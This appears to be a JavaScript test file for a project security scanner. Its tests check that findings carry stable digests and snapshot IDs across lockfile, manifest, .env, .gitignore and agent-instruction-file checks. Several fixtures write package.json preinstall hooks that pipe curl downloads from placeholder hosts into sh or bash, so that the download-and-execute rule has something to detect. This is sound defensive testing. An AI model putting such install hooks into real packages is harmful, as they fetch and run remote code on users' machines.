...
test("clean locked Node project returns no supported v1 findings and a stable inspection snapshot", async () => {
  await withProject(async (projectPath) => {
    ...
    assert.deepEqual(first.summary, { critical: 0, high: 0, medium: 0, low: 0 });
    assert.equal(first.changesMade, 0);
    assert.match(first.inspectionSnapshot.id, /^findings-snapshot-v1:[a-f0-9]{64}$/u);
    assert.equal(first.inspectionSnapshot.id, second.inspectionSnapshot.id);
  });
});
...
test("declared dependencies without a lockfile are surfaced with stable material-bound identity", async () => {
  await withProject(async (projectPath) => {
    ...
    assert.equal(item.sourceSnapshotId, first.inspectionSnapshot.id);
    assert.ok(item.evidence.some((evidence) => /^sha256:[a-f0-9]{64}$/u.test(evidence.materialDigest ?? "")));
  });
});

test("materially different dangerous script bytes cannot retain the same finding identity", async () => {
  await withProject(async (projectPath) => {
    await writeFile(resolve(projectPath, "package-lock.json"), "{}\n");
    await writeFile(resolve(projectPath, "package.json"), JSON.stringify({
      name: "dangerous-script",
      scripts: { preinstall: "curl https://one.invalid/install.sh | sh" },
    }));
    const first = scanProjectFindings(projectPath);
    ...
    await writeFile(resolve(projectPath, "package.json"), JSON.stringify({
      name: "dangerous-script",
      scripts: { preinstall: "curl https://two.invalid/other.sh | sh" },
    }));
    const second = scanProjectFindings(projectPath);
    const secondFinding = second.findings.find((candidate) => candidate.ruleId === "LV-FND-SEC-002");
    assert.ok(secondFinding);

    assert.notEqual(firstFinding.id, secondFinding.id);
    assert.notEqual(firstFinding.evidence[0]?.materialDigest, secondFinding.evidence[0]?.materialDigest);
    assert.notEqual(first.inspectionSnapshot.id, second.inspectionSnapshot.id);
  });
});

test("stored finding output carries a source snapshot that becomes detectably stale after inspected material changes", async () => {
  await withProject(async (projectPath) => {
    await writeFile(resolve(projectPath, "package-lock.json"), "{}\n");
    await writeFile(resolve(projectPath, "package.json"), JSON.stringify({
      name: "stale-report",
      scripts: { preinstall: "curl https://one.invalid/install.sh | bash" },
    }));
    const stored = scanProjectFindings(projectPath);
    const storedFinding = stored.findings.find((candidate) => candidate.ruleId === "LV-FND-SEC-002");
    assert.ok(storedFinding);
    assert.equal(storedFinding.sourceSnapshotId, stored.inspectionSnapshot.id);

    await writeFile(resolve(projectPath, "package.json"), JSON.stringify({
      name: "stale-report",
      scripts: { preinstall: "node safe-install.js" },
    }));
    const current = scanProjectFindings(projectPath);

    assert.notEqual(stored.inspectionSnapshot.id, current.inspectionSnapshot.id);
    assert.ok(!current.findings.some((candidate) => candidate.ruleId === "LV-FND-SEC-002"));
  });
});
...
test("dangerous package download-and-execute script is a strong security finding", async () => {
  await withProject(async (projectPath) => {
    ...
    assert.ok(item.evidence.every((evidence) => /^sha256:[a-f0-9]{64}$/u.test(evidence.materialDigest ?? "")));
  });
});

test("malformed package manifest becomes a material-bound high-confidence quality finding", async () => {
  await withProject(async (projectPath) => {
    await writeFile(resolve(projectPath, "package.json"), "{ not-json\n");
    const first = scanProjectFindings(projectPath);
    const firstItem = first.findings.find((candidate) => candidate.ruleId === "LV-FND-QUAL-001");
    assert.ok(firstItem);

    await writeFile(resolve(projectPath, "package.json"), "{ still-not-json\n");
    const second = scanProjectFindings(projectPath);
    const secondItem = second.findings.find((candidate) => candidate.ruleId === "LV-FND-QUAL-001");
...
test("sensitive root-file rule never reads, hashes, or exposes the secret contents", async () => {
  await withProject(async (projectPath) => {
    ...
    const sensitiveMaterial = report.inspectionSnapshot.materials.find((material) => material.path === ".env");
    assert.ok(sensitiveMaterial);
    assert.equal(sensitiveMaterial.sha256, undefined);
  });
});
...
test("gitignore material changes alter freshness and finding identity when the reported guard evidence changes", async () => {
  await withProject(async (projectPath) => {
    await mkdir(resolve(projectPath, ".git"));
    await writeFile(resolve(projectPath, ".env"), "TOKEN=hidden\n");
    await writeFile(resolve(projectPath, ".gitignore"), "# first\n");
    const first = scanProjectFindings(projectPath);
    const firstItem = first.findings.find((candidate) => candidate.ruleId === "LV-FND-SEC-003");
    assert.ok(firstItem);

    await writeFile(resolve(projectPath, ".gitignore"), "# second\n");
    const second = scanProjectFindings(projectPath);
    const secondItem = second.findings.find((candidate) => candidate.ruleId === "LV-FND-SEC-003");
    assert.ok(secondItem);
    assert.notEqual(firstItem.id, secondItem.id);
    assert.notEqual(first.inspectionSnapshot.id, second.inspectionSnapshot.id);
  });
...
test("different native agent instruction files are surfaced with material hashes without exposing contents", async () => {
  await withProject(async (projectPath) => {
    ...
    assert.ok(item.evidence.every((evidence) => evidence.detail.startsWith("sha256:") && evidence.materialDigest === evidence.detail));
  });
});
